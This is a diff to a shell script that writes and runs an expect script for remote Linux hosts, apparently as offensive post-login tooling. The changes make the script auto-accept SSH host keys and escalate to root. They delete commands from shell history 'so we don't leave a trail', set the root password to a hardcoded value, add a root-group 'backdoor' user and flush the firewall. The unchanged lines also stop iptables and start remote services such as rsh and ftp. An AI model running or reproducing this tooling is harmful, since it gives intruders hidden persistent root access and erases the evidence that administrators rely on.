@@ -13,6 +13,7 @@ expectFile="connect.exp"
 serviceStop="iptables"
 serviceStart="xinetd inetd ssh sshd cron crond anacron cups portmap nfs smb smbd samba rsync rsh rlogin ftp"
 newUser="sysd"
+newRootPass="Password!"
 newPass="Password!"
 port=22
 
@@ -21,6 +22,7 @@ if [ $# -gt 0 ]; then
 	pass=$2
 	user=`echo $firstArg | /usr/bin/env awk -F"@" '{print $1}'`
 else
+	echo "Values can also be given as command line arguments."
 	read -p "Enter host: " host
 	read -p "Enter username: " user
 	read -p "Enter password: " pass
@@ -38,33 +40,37 @@ else
 	firstCmd="sudo su"
 fi
 
-echo "attemping login"
-
 #switch to sh instead of bash or whatever default is
 
 /bin/cat <<HEAD > $expectFile
 #!/usr/bin/expect
 spawn ssh $firstArg
+expect {
+-re ".*Are.*.*yes.*no.*" {
+send "yes\n"
+exp_continue
+}
 #use correct prompt
 set prompt ":|#|\\\$"
 interact -o -nobuffer -re \$prompt return
 send "$pass\r"
+interact -o -nobuffer -re \$prompt return
+send "history -d \`history | wc -l\`; sh" #make sure we don't leave a trail
 HEAD
 
 if [ "$user" != "root" ]; then #if not root, sudo su to root and send password to be successful
 	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
-	echo "send \"history -d \`history | wc -l\`; sudo su\" #make sure we don't leave a trail" >> $expectFile
+	echo "send \"history -d \`history | wc -l\`; sudo su\"" >> $expectFile
 	echo "interact -o -nobuffer -re \"*assword*\" return" >> $expectFile
 	echo "send \"$pass\r\"" >> $expectFile
+	echo "exp_continue" >> $expectFile #not sure if i need this line or not. just in case no pw is needed
 fi
 
 /bin/cat<<MORE >> $expectFile
 interact -o -nobuffer -re \$prompt return
-send "history -d \`history | wc -l\`; sh" #make sure we don't leave a trail
+send "echo -e \"$newRootPass\n$newRootPass\" | passwd\r" #change root password
 interact -o -nobuffer -re \$prompt return
-send "echo -e \"\" | passwd\r" #change root password
-interact -o -nobuffer -re \$prompt return
-send "echo 'balls2' >> /tmp/file\r" #add 'backdoor' user
+send "useradd -g root -G sudo $newUser" #add 'backdoor' user
 interact -o -nobuffer -re \$prompt return
 send "/usr/bin/env iptables -F || ipfw flush \r"
 MORE
@@ -87,7 +93,7 @@ send "history -d \`history | wc -l\`; exit\r"
 interact
 BOTTOM
 
+echo "Attempting login..."
 # /usr/bin/expect myfile.exp
-
-echo "after expect"
+echo "Completed."
 
